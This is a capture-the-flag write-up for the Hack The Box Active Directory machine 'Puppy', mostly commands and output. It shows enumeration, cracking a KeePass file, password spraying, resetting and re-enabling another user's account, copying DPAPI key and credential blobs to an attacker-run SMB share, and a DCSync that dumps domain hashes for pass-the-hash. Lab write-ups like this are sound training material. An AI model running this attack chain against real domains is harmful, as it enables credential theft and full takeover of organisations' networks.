# Nmap

```
# Nmap 7.95 scan initiated Sun Jul 13 05:44:02 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -oN ./nmap.txt 10.10.11.70
Nmap scan report for 10.10.11.70
Host is up (0.30s latency).
Not shown: 985 filtered tcp ports (no-response)
Bug in iscsi-info: no string output.
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-12 16:44:29Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3260/tcp open  iscsi?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-12T16:46:43
|_  start_date: N/A
|_clock-skew: -2h59m44s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 13 05:49:08 2025 -- 1 IP address (1 host up) scanned in 305.99 seconds
```

We have known the credit of `levi.james`
```
Machine Information

As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025!
```
# SMB
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Puppy]
└─$ smbmap -H 10.10.11.70 -u levi.james -p 'KingofAkron2025!'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.11.70:445 Name: 10.10.11.70               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     NO ACCESS       DEV-SHARE for PUPPY-DEVS
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections                                                                                   
```
The most useful directory would be `DEV` disk, but we can't access to it.
After enumerating other directory which could be accessed, there is nothing interesting.

# RPC
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Puppy]
└─$ rpcclient 10.10.11.70 -U levi.james 
Password for [WORKGROUP\levi.james]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[levi.james] rid:[0x44f]
user:[ant.edwards] rid:[0x450]
user:[adam.silver] rid:[0x451]
user:[jamie.williams] rid:[0x452]
user:[steph.cooper] rid:[0x453]
user:[steph.cooper_adm] rid:[0x457]
rpcclient $> 

```
Then we can get a username list
```
Administrator  
Guest  
krbtgt  
levi.james  
ant.edwards  
adam.silver  
jamie.williams  
steph.cooper  
steph.cooper_adm  

```

# Bloodhound by levi.james
There is nothing interesting left, so I would like use the bloodhound to help us to get more information.
Firstly, symmetry the time period with the remote server
`sudo ntpdate puppy.htb`

Then let's use `bloodhound-python` to collect it
```
bloodhound-python -u 'levi.james' -p 'KingofAkron2025!'  -d puppy.htb -ns 10.10.11.70 -c All --zip
```
Firstly, let's check the First Degree Group Memberships of `levi.james`
![](images/Pasted%20image%2020250713031900.png)
![](images/Pasted%20image%2020250713031945.png)
And also, I noticed group `HR` has `GenericWrite` of `Developers`, that means we can access to `DEV` directory of SMB.

We can see that the `james` user has write permission to the developers group, so we can write ourselves to that group.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Puppy]
└─$ bloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'levi.james' -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
[+] levi.james added to DEVELOPERS
```

Then let's try to run the `smbmap` to check its status of `DEV`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Puppy]
└─$ smbmap -H 10.10.11.70 -u levi.james -p 'KingofAkron2025!'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.11.70:445 Name: dc.puppy.htb              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     READ ONLY       DEV-SHARE for PUPPY-DEVS
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections                                                         
```

Great job !!!!!
Let's enumerate the directory and check what is in it.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Puppy]
└─$ smbclient  //10.10.11.70/DEV -U levi.james           
Password for [WORKGROUP\levi.james]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Mar 23 18:07:57 2025
  ..                                  D        0  Sun Mar  9 03:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 18:09:12 2025
  Projects                            D        0  Sun Mar  9 03:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 13:25:46 2025

                5080575 blocks of size 4096. 1650186 blocks available
smb: \> cd Projects\
smb: \Projects\> ls
  .                                   D        0  Sun Mar  9 03:53:36 2025
  ..                                 DR        0  Sun Mar 23 18:07:57 2025

                5080575 blocks of size 4096. 1650186 blocks available

```
Then let's download the `recovery.kdbx`, I tried using the built-in keepass2john but it showed the wrong version
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Puppy]
└─$ file recovery.kdbx                                                     
recovery.kdbx: Keepass password database 2.x KDBX

┌──(wither㉿localhost)-[~/Templates/htb-labs/Puppy]
└─$ keepass2john recovery.kdbx
! recovery.kdbx : File version '40000' is currently not supported!
```


So I have to use the other tools to crack it.
`https://github.com/r3nt0n/keepass4brute`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Puppy/keepass4brute]
└─$ ./keepass4brute.sh ../recovery.kdbx /usr/share/wordlists/rockyou.txt 
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 36/14344392 - Attempts per minute: 93 - Estimated time remaining: 15 weeks, 2 days
[+] Current attempt: liverpool

[*] Password found: liverpool

```

Then we can use `keepassxc` to open this file
```
keepassxc recovery.kdbx
```
![](images/Pasted%20image%2020250713032858.png)
We can get some password value
```
HJKL2025!
Antman2025!
JamieLove2025!
ILY2025!
Steve2025!
```

# netexec

Remember we have get the user list, so we can use `netexec` to correspond to them one by one
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Puppy]
└─$ netexec smb 10.10.11.70 -u username.txt -p password.txt
[*] Initializing SMB protocol database
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Administrator:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Guest:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\krbtgt:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\levi.james:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ant.edwards:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Administrator:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Guest:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\krbtgt:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\levi.james:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 

```

Then we get the credit of  `ant.edwards:Antman2025!`

# Bloodhound by ant.edwards
Continue to get the bloodhound with the new credit.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Puppy]
└─$ bloodhound-python -u 'ant.edwards' -p 'Antman2025!'  -d puppy.htb -ns 10.10.11.70 -c All --zip                                   
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 01M 07S
INFO: Compressing output into 20250713033358_bloodhound.zip

```

![](images/Pasted%20image%2020250713033639.png)
You can see that the group that Edwards belongs to has full control over silver, so you can change the password.
Let's exploit it
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Puppy]
└─$ bloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'ant.edwards' -p 'Antman2025!' set password ADAM.SILVER Abc123456!
[+] Password changed successfully!
```

Although the changes here were successful, I still couldn't log in. I found that the reason was that the account was not enabled.
![](images/Pasted%20image%2020250713033847.png)
The enabled list is False, so we need to enable it and use the new password to connect it.

Use `ldapsearch` to check and 
```
ldapsearch -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W -b "DC=puppy,DC=htb" "(sAMAccountName=ADAM.SILVER)"                       ⏎

Enter LDAP Password: 
# extended LDIF
#
# LDAPv3
# base <DC=puppy,DC=htb> with scope subtree
# filter: (sAMAccountName=ADAM.SILVER)
# requesting: ALL
#

# Adam D. Silver, Users, PUPPY.HTB
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Adam D. Silver
sn: Silver
givenName: Adam
initials: D
distinguishedName: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
instanceType: 4
whenCreated: 20250219121623.0Z
whenChanged: 20250528182522.0Z
displayName: Adam D. Silver
uSNCreated: 12814
memberOf: CN=DEVELOPERS,DC=PUPPY,DC=HTB
memberOf: CN=Remote Management Users,CN=Builtin,DC=PUPPY,DC=HTB
uSNChanged: 172152
name: Adam D. Silver
objectGUID:: 6XTdGwRTsk6ta8cxNx8K6w==
userAccountControl: 66050
badPwdCount: 0
codePage: 0
countryCode: 0
homeDirectory: C:\Users\adam.silver
badPasswordTime: 133863842084684611
lastLogoff: 0
lastLogon: 133863842265461471
pwdLastSet: 133929303224406100
primaryGroupID: 513
userParameters:: ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI
 CAgUAQaCAFDdHhDZmdQcmVzZW5045S15pSx5oiw44GiGAgBQ3R4Q2ZnRmxhZ3Mx44Cw44Gm44Cy44
 C5EggBQ3R4U2hhZG9344Cw44Cw44Cw44CwKgIBQ3R4TWluRW5jcnlwdGlvbkxldmVs44Sw
objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiHUQQAAA==
adminCount: 1
accountExpires: 9223372036854775807
logonCount: 6
sAMAccountName: adam.silver
sAMAccountType: 805306368
userPrincipalName: adam.silver@PUPPY.HTB
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=PUPPY,DC=HTB
dSCorePropagationData: 20250309210803.0Z
dSCorePropagationData: 20250228212238.0Z
dSCorePropagationData: 20250219143627.0Z
dSCorePropagationData: 20250219142657.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133863576267401674

# search reference
ref: ldap://ForestDnsZones.PUPPY.HTB/DC=ForestDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://DomainDnsZones.PUPPY.HTB/DC=DomainDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://PUPPY.HTB/CN=Configuration,DC=PUPPY,DC=HTB

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3

```

Then we can use `ldapmodify` to modify the value
```
ldapmodify -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W << EOF
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
changetype: modify
replace: userAccountControl
userAccountControl: 66048
EOF
```

Then we can use `evil-winrm` to connect it 
![](images/Pasted%20image%2020250713034436.png)

# Privilege Escalation
In the `C:\Backups` directory, there is a `site-backup-2024-12-30.zip`.
Download it and extract it, we find another credit
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Puppy/puppy]
└─$ cat nms-auth-config.xml.bak 
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>

steph.cooper:ChefSteph2025!
```

# Bloodhound by steph.cooper
Then continue to bloodhound it with this credit.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Puppy]
└─$ bloodhound-python -u 'steph.cooper' -p 'ChefSteph2025!'  -d puppy.htb -ns 10.10.11.70 -c All --zip   
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 01M 10S
INFO: Compressing output into 20250713035116_bloodhound.zip

```
![](images/Pasted%20image%2020250713035418.png)
But for the `Remote management` group, there is nothing interesting with it.

Combined with something similar to DPAPI found on the silver desktop before
```
*Evil-WinRM* PS C:\Users\adam.silver\desktop> dir -h


    Directory: C:\Users\adam.silver\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         2/28/2025  12:31 PM            282 desktop.ini
-a-hs-         2/28/2025  12:31 PM          11068 DFBE70A7E5CC19A398EBF1B96859CE5D

```

So let's check what is going on for the file directory of `Steph cooper`

First, we need to get the credentials saved in Windows Credential Manager, which uses `DPAPI` encryption (`CryptProtectData`) and binds the user or computer's `MasterKey`.
```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> dir -h


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9

*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> download C8D69EBE9A43E9DEBF6B5FBD48B521B9
                                        
Info: Downloading C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 to C8D69EBE9A43E9DEBF6B5FBD48B521B9
                                        
Error: Download failed. Check filenames or paths: uninitialized constant WinRM::FS::FileManager::EstandardError

```
I try to directly download it, but it would be blocked. So let's try another way to download it.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Puppy]
└─$ impacket-smbserver share ./share -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

For the target machine
```
*Evil-WinRM* PS C:\> copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" \\10.10.14.16\share\masterkey_blob
*Evil-WinRM* PS C:\> copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" \\10.10.14.16\share\credential_blob

```

Decrypt the user's `DPAPI` master key (`masterkey`) using the user's password (`ChefSteph2025!`) and SID, and output the user's master key (`decrypted Key`)
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Puppy/share]
└─$ impacket-dpapi masterkey -file masterkey_blob/556a2412-1275-4ccf-b721-e6a0b4f90407 -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84

```

Decrypt the stored credentials (credential_blob) using the master key obtained in step 1, and output the plaintext credentials (username and password)

Get the password of `steph.cooper_adm`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Puppy/share]
└─$ impacket-dpapi credential -file credential_blob -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!

```

# Bloodhound by steph.cooper_adm
Then let's continue bloodhound it by `steph.cooper_adm`
```
bloodhound-python -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!'  -d puppy.htb -ns 10.10.11.70 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 21 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.70:445)] timed out
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
INFO: Done in 01M 20S
INFO: Compressing output into 20250528153956_bloodhound.zip

```
![](images/Pasted%20image%2020250713041822.png)
![](images/Pasted%20image%2020250713041920.png)
You can now use `DCSync` directly
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Puppy]
└─$ impacket-secretsdump 'puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025!'@10.10.11.70
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xa943f13896e3e21f6c4100c7da9895a6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9c541c389e2904b9b112f599fd6b333d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
PUPPY\DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795d9ec85ebda45
PUPPY\DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30
PUPPY\DC$:des-cbc-md5:54e9a11619f8b9b5
PUPPY\DC$:plain_password_hex:84880c04e892448b6419dda6b840df09465ffda259692f44c2b3598d8f6b9bc1b0bc37b17528d18a1e10704932997674cbe6b89fd8256d5dfeaa306dc59f15c1834c9ddd333af63b249952730bf256c3afb34a9cc54320960e7b3783746ffa1a1528c77faa352a82c13d7c762c34c6f95b4bbe04f9db6164929f9df32b953f0b419fbec89e2ecb268ddcccb4324a969a1997ae3c375cc865772baa8c249589e1757c7c36a47775d2fc39e566483d0fcd48e29e6a384dc668228186a2196e48c7d1a8dbe6b52fc2e1392eb92d100c46277e1b2f43d5f2b188728a3e6e5f03582a9632da8acfc4d992899f3b64fe120e13
PUPPY\DC$:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc21ea457ed3d6fd425344b3a5ca40769f14296a3
dpapi_userkey:0xcb6a80b44ae9bdd7f368fb674498d265d50e29bf
[*] NL$KM 
 0000   DD 1B A5 A0 33 E7 A0 56  1C 3F C3 F5 86 31 BA 09   ....3..V.?...1..
 0010   1A C4 D4 6A 3C 2A FA 15  26 06 3B 93 E0 66 0F 7A   ...j<*..&.;..f.z
 0020   02 9A C7 2E 52 79 C1 57  D9 0C D3 F6 17 79 EF 3F   ....Ry.W.....y.?
 0030   75 88 A3 99 C7 E0 2B 27  56 95 5C 6B 85 81 D0 ED   u.....+'V.\k....
NL$KM:dd1ba5a033e7a0561c3fc3f58631ba091ac4d46a3c2afa1526063b93e0660f7a029ac72e5279c157d90cd3f61779ef3f7588a399c7e02b2756955c6b8581d0ed
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a4f2989236a639ef3f766e5fe1aad94a:::
PUPPY.HTB\levi.james:1103:aad3b435b51404eeaad3b435b51404ee:ff4269fdf7e4a3093995466570f435b8:::
PUPPY.HTB\ant.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac881b79a524c8e99d2b34f438058b:::
PUPPY.HTB\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\jamie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a08abd5a98a213fc8e3c7fca780:::
PUPPY.HTB\steph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f931285ce8ea01a8613f09200b:::
PUPPY.HTB\steph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb206409049bc53502039b80f3f1173:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
```

Then we can use this hash to get the administrator shell
![](images/Pasted%20image%2020250713042641.png)

# Description

A very good Active Directory machine, with a difficulty similar to that of the `OSCP` exam, which mainly requires continuous enumeration and continuous information collection at the current stage.